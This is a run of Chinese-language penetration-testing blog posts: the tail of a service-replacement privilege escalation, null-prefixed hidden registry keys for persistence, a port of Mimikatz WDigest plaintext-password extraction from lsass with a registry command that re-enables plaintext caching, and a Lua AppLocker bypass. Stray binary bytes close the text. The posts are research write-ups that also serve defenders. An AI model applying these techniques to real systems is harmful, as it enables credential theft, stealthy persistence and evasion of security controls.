<p>删除文件： <code class="language-plaintext highlighter-rouge">del test.exe</code></p>

<p>编译文件： <code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe test.cs</code></p>

<p>将psexec保存在c:\test</p>

<p>启动服务： <code class="language-plaintext highlighter-rouge">sc start Test</code></p>

<p>此时，能够看到system权限calc.exe的界面，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-3.png" alt="Alt text"></p>

<h3 id="7使用powershell脚本扫描">7、使用powershell脚本扫描</h3>

<p>如下图，标记出服务命令和可供替换的路径，便于进行替换</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-7/3-4.png" alt="Alt text"></p>

<p>该脚本能够自动判断当前系统是否存在可供利用的服务</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>如果找到了一个普通用户权限可写的Windows服务，对其可执行文件进行替换，那么在服务重启后，就能以system权限执行替换后的文件，可用作提权。</p>

<p>本文开源的脚本可用来自动查找当前系统是否存在普通用户权限可写的Windows服务，站在防御者的角度，也可以用该脚本测试自己的系统。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September  7, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——"隐藏"注册表的创建</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>知名恶意软件Poweliks曾使用过的一个后门技术，在注册表启动位置创建一个特殊的注册表键值，通过mshta来执行payload</p>

<p>对于这个特殊的注册表键值，在正常情况下无法对其访问，这其中的原理是什么呢?如何读取、创建以及如何删除呢?本文将要一一介绍</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>隐藏注册表的原理</li>
  <li>隐藏注册表的实现</li>
  <li>程序编写上需要注意的问题</li>
</ul>

<h2 id="0x02-原理">0x02 原理</h2>
<hr>

<p>注册表键值名称经过特殊构造： 以”\0”作为开头，后面加上任意字符(不能为数字)</p>

<p>对于Windows系统，”\0”(即0x0000)会被识别为字符串的结束符，所以在对该字符串读取的过程中，遇到开头的”\0”，会被解析成结束符，提前截断，导致读取错误</p>

<p>而使用Native API设定注册表，需要使用结构体<code class="language-plaintext highlighter-rouge">OBJECT_ATTRIBUTES</code>作为参数， 指定读取的字符串长度</p>

<p>只要长度设定正常，就能够读取正确的字符串，避免这个bug</p>

<p>所以，我们可以通过Native API来创建这个特殊的注册表名</p>

<p>更为重要的是，像regedit.exe和其他对注册表的操作，通常会调用Win32 API，这就导致该注册表无法被读取，也就实现了所谓的”隐藏”</p>

<p>综上，创建方法为： <strong>通过Native API创建一个以”\0”开头的键值</strong></p>

<h2 id="0x03-编写程序实现">0x03 编写程序实现</h2>
<hr>

<p>通过Native API实现对注册表的操作，可供参考的工程地址：</p>

<p>https://www.codeproject.com/Articles/14508/Registry-Manipulation-Using-NT-Native-APIs</p>

<p>作者Dan Madden，他的代码使用了类的封装</p>

<p>个人倾向于使用最基本的api实现，于是参考他的代码，重新设计</p>

<p>对于Native API，需要的结构如下：</p>

<h3 id="1获取native-api的地址">1.获取Native API的地址</h3>

<p>注册表操作的相关Native API可从ntdll.dll中获得</p>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HINSTANCE hinstStub = GetModuleHandle(_T("ntdll.dll"));
NtOpenKey = (LPNTOPENKEY)GetProcAddress(hinstStub, "NtOpenKey");
</code></pre></div></div>

<h3 id="2native-api的重定义和声明">2.Native API的重定义和声明</h3>

<p>Native API在使用前需要重定义和声明</p>

<p>部分关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef NTSTATUS (STDAPICALLTYPE NTOPENKEY)
(
	IN HANDLE				KeyHandle,
	IN ULONG				DesiredAccess,
	IN POBJECT_ATTRIBUTES	ObjectAttributes
);
typedef NTOPENKEY FAR * LPNTOPENKEY;
LPNTOPENKEY					NtOpenKey;
</code></pre></div></div>

<h3 id="3-特殊结构体的使用">3. 特殊结构体的使用</h3>

<p>注册表操作相关Native API会使用到如下结构体，需要定义和声明</p>

<ul>
  <li>InitializeObjectAttributes</li>
  <li>_STRING</li>
  <li>_UNICODE_STRING</li>
  <li>_OBJECT_ATTRIBUTES</li>
  <li>_KEY_INFORMATION_CLASS</li>
  <li>_KEY_BASIC_INFORMATION</li>
  <li>_KEY_VALUE_PARTIAL_INFORMATION</li>
  <li>_KEY_VALUE_INFORMATION_CLASS</li>
  <li>RtlInitAnsiString</li>
  <li>RtlAnsiStringToUnicodeString</li>
</ul>

<p>Dan Madden的工程实现了创建隐藏注册表项(注册表项名称以\0开头)，该注册表项下的键值通过正常的Native API实现创建、读取、删除</p>

<p>通过最基本api的实现过程不再赘述，封装好的API源代码可参考文末给出的链接</p>

<p>测试Dan Madden工程包含的功能：</p>

<h4 id="1创建隐藏注册表项">1.创建隐藏注册表项</h4>

<p><code class="language-plaintext highlighter-rouge">MyCreateHiddenKey("\\Registry\\Machine\\Software\\testhidden");</code></p>

<p>使用注册表工具regedit.exe无法打开该键值，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-5/2-1.png" alt="Alt text"></p>

<h4 id="2在该注册表下创建注册表键值">2.在该注册表下创建注册表键值</h4>

<p>先获得该注册表项的句柄：</p>

<p><code class="language-plaintext highlighter-rouge">hKey = MyOpenHiddenKey("\\Registry\\Machine\\Software\\testhidden");</code></p>

<p>创建注册表项下的键值test1并赋值：</p>

<p><code class="language-plaintext highlighter-rouge">MySetValueKey(hKey,"test1","0123456789abcdef",REG_SZ);</code></p>

<p>读取该注册表项下键值test1的内容：</p>

<p><code class="language-plaintext highlighter-rouge">MyQueryValueKeyString(hKey,"test1");</code></p>

<p>删除该注册表项下的键值test1：</p>

<p><code class="language-plaintext highlighter-rouge">MyDeleteValueKey(hKey,"test1");</code></p>

<p>删除注册表项：</p>

<p><code class="language-plaintext highlighter-rouge">MyDeleteKey(hKey);</code></p>

<p>程序输出如下图，成功对隐藏注册表项下的正常键值进行操作</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-5/2-2.png" alt="Alt text"></p>

<p>接下来，对Dan Madden的工程添加新的功能：创建、读取、删除隐藏注册表键值，思路如下：</p>

<p>对于注册表项的隐藏，在注册表项的名称首位填”\0”即可</p>

<p>对应注册表键值的隐藏，原理上也是在键值的名称首位填”\0”，但在参数传递上需要注意更多问题</p>

<h3 id="1不需要修改的功能">1.不需要修改的功能</h3>

<p>创建注册表键、打开注册表键和删除注册表键的功能不需要修改，使用正常的名称即可</p>

<h3 id="2设置注册表键值">2.设置注册表键值</h3>

<p>对应源代码中的MySetHiddenValueKey</p>

<p>传入参数使用char型数组，，用来定义注册表键值名称，内容为”\0abcd”</p>

<p>由于”\0”的存在，所以无法直接使用strlen计算数组长度</p>

<p>变通方法：</p>

<p>计算从偏移2开始的数组长度，最终再加2</p>

<p>即len = strlen(buf+2)+2</p>

<p>Native API NtSetValueKey用来设定键值，定义如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef NTSTATUS (STDAPICALLTYPE NTSETVALUEKEY)
(
	IN HANDLE			KeyHandle,
	IN PUNICODE_STRING	ValueName,
	IN ULONG			TitleIndex,			/* optional */
	IN ULONG			Type,
	IN PVOID			Data,
	IN ULONG			DataSize
);
</code></pre></div></div>

<p>第二个参数指定键值名称，需要使用结构体UNICODE_STRING</p>

<p>正常情况下，我们需要先使用<code class="language-plaintext highlighter-rouge">RtlInitAnsiString</code>将传入的buf数组转换成结构体ANSI_STRING，再使用<code class="language-plaintext highlighter-rouge">RtlAnsiStringToUnicodeString</code>将其转换成结构体UNICODE_STRING，作为参数</p>

<p>由于”\0”的存在，无法使用<code class="language-plaintext highlighter-rouge">RtlAnsiStringToUnicodeString</code></p>

<p>所以，我们需要自己实现结构体ANSI_STRING向结构体UNICODE_STRING的转换</p>

<p>ANSI向UNICODE的转换，在长度计算上，乘以2即可</p>

<p>数组内容上，奇数位赋值，偶数为填0x00</p>

<p>当然，我们需要一个中转数组TempBuff实现数组内容的转换</p>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ValueName.Length = asName.Length*2;
ValueName.MaximumLength = asName.MaximumLength*2;
char *TempBuff;
TempBuff = (char*)malloc(ValueName.Length);
for(int i=0;i&lt;asName.Length;i++)
{
	TempBuff[i*2] = asName.Buffer[i];
	TempBuff[i*2+1] = 0x00;
}
ValueName.Buffer = (WCHAR *)TempBuff;
</code></pre></div></div>

<p>第四个参数，指定键值内容，需要将传入的char数组转换为WCHAR</p>

<p>关键代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WCHAR wszValue[1024];
unsigned int n ;
for (n=0; n&lt;strlen(csData); n++) {
	wszValue[n] = (WCHAR)csData[n];
}
wszValue[n++] = L'\0';
</code></pre></div></div>

<h3 id="3读取注册表键值">3.读取注册表键值</h3>

<p>对应源代码中的MyQueryHiddenValueKeyString</p>

<p>参照2，需要注意”\0”的影响</p>

<h3 id="4删除注册表键值">4、删除注册表键值</h3>

<p>对应源代码中的MyDeleteHiddenValueKey</p>

<p>参照2，需要注意”\0”的影响</p>

<p><strong>实际测试：</strong></p>

<p>创建注册表项test2,创建隐藏注册表键值\0test2,创建正常注册表键值test2</p>

<p>直接打开，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-5/2-3.png" alt="Alt text"></p>

<p>能够正常访问注册表键值test2，但无法访问注册表键值\0test2</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-5/2-4.png" alt="Alt text"></p>

<p>而我们编写的程序能够正常读取，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-5/2-5.png" alt="Alt text"></p>

<p>至此，成功实现对注册表键值的隐藏</p>

<p>以上功能代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/HiddenNtRegistry</p>

<h2 id="0x04-powershell实现">0x04 powershell实现</h2>
<hr>

<p>可参考Brian Reitz的工程，地址如下：</p>

<p>https://gist.github.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741</p>

<p>具体说明可参考：</p>

<p>https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353?source=collection_archive———2—————-</p>

<p>实现了在<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>下创建键值\0abcd，内容为<code class="language-plaintext highlighter-rouge">mshta javascript:alert(1)</code></p>

<p>使用我们编写的程序成功读取该键值，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-5/4-1.png" alt="Alt text"></p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>PSReflect-Functions包含多个通过powershell调用API的实例代码，地址如下：</p>

<p>https://github.com/jaredcatkinson/PSReflect-Functions</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了Poweliks使用过的注册表隐藏技术，分析原理，编写c程序实现功能，测试powershell实现代码</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December  5, 2017
  </div>

  
</article><article class="post">
  <h1>Mimikatz中sekurlsa::wdigest的实现</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Mimikatz中sekurlsa::wdigest是渗透测试中经常会用到的功能，它能够从lsass进程中提取凭据，通常可获得已登录用户的明文口令(Windows Server 2008 R2及更高版本的系统默认无法获得，需要修改注册表等待用户再次登录才能获得)</p>

<p>XPN在他的博客中记录了对WDigest的研究心得，开源了一个POC，通过C++实现了在Win10_1809 x64下从lsass进程中提取凭据</p>

<p>本文将会对XPN的POC进行扩展，使其支持Win7/Win8/Windows Server2008/Windows Server2008 R2/Windows Server2012/Windows Server2012 R2，记录程序实现的细节与过程</p>

<p>XPN的博客：</p>

<p>https://blog.xpnsec.com/exploring-mimikatz-part-1/</p>

<p>POC：</p>

<p>https://gist.github.com/xpn/12a6907a2fce97296428221b3bd3b394</p>

<h2 id="0x02-简介">0x02 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>实现思路</li>
  <li>程序实现细节</li>
</ul>

<h2 id="0x03-实现思路">0x03 实现思路</h2>
<hr>

<ol>
  <li>提升至Debug权限</li>
  <li>获得lsass进程句柄</li>
  <li>枚举lsass进程中全部模块的句柄，定位wdigest.dll和lsasrv.dll在内存中的位置</li>
  <li>从lsasrv.dll中获得InitializationVector，AES和3DES的值，用于解密</li>
  <li>从wdigest.dll中获得每条凭据的信息，判断加密算法，解密获得明文口令</li>
</ol>

<p>具体说明如下：</p>

<h3 id="1-提升至debug权限">1. 提升至Debug权限</h3>

<p>代码可直接使用之前的代码：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/CheckCriticalProess.cpp#L14-L29</p>

<h3 id="2-获得lsass进程句柄">2. 获得lsass进程句柄</h3>

<ul>
  <li>通过CreateToolhelp32Snapshot创建进程快照</li>
  <li>遍历进程列表</li>
  <li>搜索进程lsass.exe，获得pid</li>
  <li>获得lsass进程句柄</li>
</ul>

<h3 id="3-枚举lsass进程中全部模块的句柄定位wdigestdll和lsasrvdll在内存中的位置">3. 枚举lsass进程中全部模块的句柄，定位wdigest.dll和lsasrv.dll在内存中的位置</h3>

<p>通过EnumProcessModules枚举lsass进程中全部模块的句柄</p>

<h3 id="4-从lsasrvdll中获得initializationvectoraes和3des的值用于解密">4. 从lsasrv.dll中获得InitializationVector，AES和3DES的值，用于解密</h3>

<p>不同系统的偏移位置不同，详细可参考mimikatz的源码：</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/68ac65b426d1b9e1354dd0365676b1ead15022de/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c#L8-L32</p>

<p>偏移不同的位置有以下四个：</p>

<ul>
  <li>LsaInitializeProtectedMemory_KEY</li>
  <li>int IV_OFFSET</li>
  <li>int DES_OFFSET</li>
  <li>int AES_OFFSET</li>
</ul>

<p>不同系统下AES和3DES的数据结构也不同：</p>

<p>Win7：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _KIWI_BCRYPT_KEY {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG bits;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>来源于：
https://github.com/gentilkiwi/mimikatz/blob/master/modules/kull_m_crypto.h#L56</p>

<p>Win8和Win10：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _KIWI_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2; 
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>来源于：
https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h#L22</p>

<p>其中，KIWI_BCRYPT_KEY和KIWI_BCRYPT_KEY81中的KIWI_HARD_KEY存储AES和3DES的数据，结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _KIWI_HARD_KEY {
	ULONG cbSecret;
	BYTE data[ANYSIZE_ARRAY]; // etc...
} KIWI_HARD_KEY, *PKIWI_HARD_KEY;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>来源于：
https://github.com/gentilkiwi/mimikatz/blob/master/modules/kull_m_crypto.h#L51</p>

<p><code class="language-plaintext highlighter-rouge">ULONG cbSecret</code>表示长度，<code class="language-plaintext highlighter-rouge">BYTE data[ANYSIZE_ARRAY]</code>为实际加密内容</p>

<h3 id="5-从wdigestdll中获得每条凭据的信息解密出明文口令">5. 从wdigest.dll中获得每条凭据的信息，解密出明文口令</h3>

<p>凭据信息位于固定偏移位置，可通过搜索固定结构(<code class="language-plaintext highlighter-rouge">BYTE PTRN_WIN6_PasswdSet[]	= {0x48, 0x3b, 0xd9, 0x74};</code>)定位</p>

<p><strong>注：</strong></p>

<p>来源于：
https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c#L14</p>

<p>每条凭据以双链表的格式存储，格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _KIWI_WDIGEST_LIST_ENTRY {
	struct _KIWI_WDIGEST_LIST_ENTRY *Flink;
	struct _KIWI_WDIGEST_LIST_ENTRY *Blink;
	ULONG	UsageCount;
	struct _KIWI_WDIGEST_LIST_ENTRY *This;
	LUID LocallyUniqueIdentifier;
} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>来源于：
https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.h#L14</p>

<p>每个节点偏移48的位置存储凭据信息，格式如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>typedef struct _KIWI_GENERIC_PRIMARY_CREDENTIAL
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	LSA_UNICODE_STRING Password;
} KIWI_GENERIC_PRIMARY_CREDENTIAL, *PKIWI_GENERIC_PRIMARY_CREDENTIAL;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>来源于：
https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/globals_sekurlsa.h#L36</p>

<p>每条凭据会根据加密数据的长度选择算法：</p>

<ul>
  <li>如果加密后的数据长度为8的倍数，那么在CFB模式下使用AES</li>
  <li>否则，在CBC模式下使用3DES</li>
</ul>

<h2 id="0x04-程序实现细节">0x04 程序实现细节</h2>
<hr>

<p>XPN的POC支持在Win10_1809 x64下从lsass进程中提取凭据，地址如下：</p>

<p>https://gist.github.com/xpn/12a6907a2fce97296428221b3bd3b394</p>

<p>为了使其支持Win7/Win8/Windows Server2008/Windows Server2008 R2/Windows Server2012/Windows Server2012 R2，需要考虑如下问题：</p>

<h3 id="1-添加提升至debug权限的代码">1. 添加提升至Debug权限的代码</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}
</code></pre></div></div>

<h3 id="2-判断操作系统版本">2. 判断操作系统版本</h3>

<p>这里可以使用之前的代码，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetOSVersion.cpp</p>

<p>需要注意的是代码对Win10的具体版本没有进行判断，而不同的Win10系统，偏移会有不同，例如Win10_1507和Win10_1903</p>

<p><strong>注：</strong></p>

<p>来源于
https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c#L21-L22</p>

<h3 id="3-不同操作系统版本对应不同的偏移">3. 不同操作系统版本对应不同的偏移</h3>

<p>影响以下四个参数：</p>

<ul>
  <li>LsaInitializeProtectedMemory_KEY</li>
  <li>int IV_OFFSET</li>
  <li>int DES_OFFSET</li>
  <li>int AES_OFFSET</li>
</ul>

<h3 id="4-不同操作系统版本对应不同的aes和3des数据结构">4. 不同操作系统版本对应不同的AES和3DES数据结构</h3>

<p>Win7：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KIWI_BCRYPT_KEY extracted3DesKey, extractedAesKey;
</code></pre></div></div>

<p>Win8和Win10：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
</code></pre></div></div>

<h3 id="5对每条凭据中加密数据的长度进行判断">5.对每条凭据中加密数据的长度进行判断</h3>

<p>使用不同的解密算法并在输出上进行体现：</p>

<ul>
  <li>如果加密后的数据长度为8的倍数，那么在CFB模式下使用AES</li>
  <li>否则，在CBC模式下使用3DES</li>
</ul>

<p>完整代码已开源，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/sekurlsa-wdigest.cpp</p>

<p>代码实现了对64位系统的凭据读取，输出信息同mimikatz的sekurlsa::wdigest结果相同，支持以下操作系统：</p>

<ul>
  <li>Win7 x64/Windows Server 2008 x64/Windows Server 2008R2 x64</li>
  <li>Win8 x64/Windows Server 2012 x64/Windows Server 2012R2 x64</li>
  <li>Win10_1507(and before 1903) x64</li>
</ul>

<p>如果想要支持Win10_1903，可添加对Win10_1903及更高版本的系统进行识别，加上对应的偏移计算即可</p>

<p>如果想要支持32位系统，修改对应变量的偏移即可</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>对于Windows Server 2008 R2及更高版本的系统，默认配置下无法在凭据中保存明文信息，也就无法导出明文口令，可通过修改注册表启用Wdigest Auth解决这个问题，方法如下：</p>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p>or powershell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
</code></pre></div></div>

<p>等待用户再次登录，就能获得凭据中的明文信息</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对XPN的POC进行扩展，使其支持Win7/Win8/Windows Server2008/Windows Server2008 R2/Windows Server2012/Windows Server2012 R2，
实现了Mimikatz中sekurlsa::wdigest的功能，记录程序实现的细节与过程</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June  6, 2019
  </div>

  
</article><article class="post">
  <h1>使用LUA脚本绕过Applocker的测试分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章《Bypass Windows AppLocker》曾对绕过Applocker的方法进行过学习，而最近看到一篇文章介绍了使用LUA脚本绕过Applocker的方法，学习之后产生了以下疑问：绕过原理是什么呢？能绕过哪种AppLocker的规则呢？适用条件又是什么呢？</p>

<p>文章地址：</p>

<p>https://homjxi0e.wordpress.com/2018/03/02/whitelisting-bypassing-using-lua-lanuage-wlua-com/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>LUA脚本简介</li>
  <li>绕过测试</li>
  <li>绕过原理</li>
  <li>适用条件</li>
  <li>防御方法</li>
</ul>

<h2 id="0x02-lua脚本简介">0x02 LUA脚本简介</h2>
<hr>

<ul>
  <li>轻量小巧的脚本语言</li>
  <li>用标准C语言编写</li>
  <li>可以被C/C++ 代码调用</li>
  <li>可以调用C/C++的函数</li>
  <li>在目前所有脚本引擎中的速度最快</li>
</ul>

<h2 id="0x03-windows系统下执行lua脚本">0x03 Windows系统下执行LUA脚本</h2>
<hr>

<p>1、安装Lua for Windows，下载地址：</p>

<p>http://files.luaforge.net/releases/luaforwindows/luaforwindows</p>

<p>2、输出hello world</p>

<p>脚本内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print"Hello,world!"
</code></pre></div></div>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lua.exe 1.txt
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-1.png" alt="Alt text"></p>

<p>3、调用Windows API</p>

<p>脚本内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require "alien"
MessageBox = alien.User32.MessageBoxA 
MessageBox:types{ret ='long',abi ='stdcall','long','string','string','long'}
MessageBox(0, "title for test","LUA call windows api",0)
</code></pre></div></div>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-2.png" alt="Alt text"></p>

<p>4、c++执行LUA脚本</p>

<p>参考代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extern "C" {  
#include "lua.h"    
#include &lt;lauxlib.h&gt;     
#include &lt;lualib.h&gt;     
} 
int main(int argc,char* argv[])
{
	lua_State *L =  lua_open();
    luaL_openlibs(L);
    luaL_dofile(L, argv[1]);
    lua_close(L);
    return 0;
}
</code></pre></div></div>

<p>工程需要做如下设置：</p>

<p>(1)修改<code class="language-plaintext highlighter-rouge">VC++ 目录</code></p>

<p><code class="language-plaintext highlighter-rouge">包含目录</code>，添加<code class="language-plaintext highlighter-rouge">C:\Program Files\Lua\5.1\include</code></p>

<p><code class="language-plaintext highlighter-rouge">库目录</code>，添加<code class="language-plaintext highlighter-rouge">C:\Program Files\Lua\5.1\lib</code></p>

<p>(2)<code class="language-plaintext highlighter-rouge">链接器</code> - <code class="language-plaintext highlighter-rouge">输入</code> - <code class="language-plaintext highlighter-rouge">附加依赖项</code>，添加</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lua5.1.lib
lua51.lib
</code></pre></div></div>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/3-1.png" alt="Alt text"></p>

<p>c++执行LUA脚本来调用Windows API，需要在同级目录添加支持文件，执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/3-2.png" alt="Alt text"></p>

<h2 id="0x04-测试使用lua脚本绕过applocker">0x04 测试使用LUA脚本绕过Applocker</h2>
<hr>

<h3 id="测试一">测试一：</h3>

<p>测试系统： Win7x86</p>

<p>安装Lua for Windows</p>

<p>开启Applocker，配置默认规则</p>

<p>使用lua.exe执行脚本：</p>

<p>成功绕过Applocker的拦截</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-3.png" alt="Alt text"></p>

<h3 id="测试二">测试二：</h3>

<p>测试系统： Win7x86</p>

<p>安装Lua for Windows</p>

<p>开启Applocker，配置默认规则，添加规则： 拦截lua.exe</p>

<p>未绕过Applocker的拦截</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>还可以使用wlua.exe执行lua脚本</p>

<h3 id="测试三">测试三：</h3>

<p>测试系统： Win7x64</p>

<p>未安装Lua for Windows</p>

<p>开启Applocker，配置默认规则，系统禁止执行脚本</p>

<p>lua.exe同级目录放置lua5.1.dll(来自Lua for Windows安装路径)</p>

<p>使用lua.exe执行脚本：</p>

<p>未绕过Applocker的拦截</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-3-6/2-5.png" alt="Alt text"></p>

<p><strong>补充：</strong></p>

<p>将lua.exe换成wlua.exe，脚本内容修改为POC内容，地址如下：</p>

<p>https://gist.githubusercontent.com/homjxi0e/fd023113bf8b1b6789afa05c3913157c/raw/6bf41cbd76e9df6d6d3edcc9e289191f898451dc/AppLockerBypassing.wlua</p>

<p>测试结果均相同</p>

<h2 id="0x05-最终结论">0x05 最终结论</h2>
<hr>

<p>经过以上测试，得出最终结论：</p>

<p>使用LUA脚本，在一定程序上能绕过Applocker，但需要满足以下条件：</p>

<ul>
  <li>当前系统已安装Lua for Windows</li>
  <li>Applocker的规则未禁止lua.exe和wlua.exe</li>
</ul>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对LUA脚本的开发做了简要介绍，测试使用LUA脚本绕过Applocker的POC，得出最终结论</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March  6, 2018
  </div>

  
</article>   Bud1            %                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       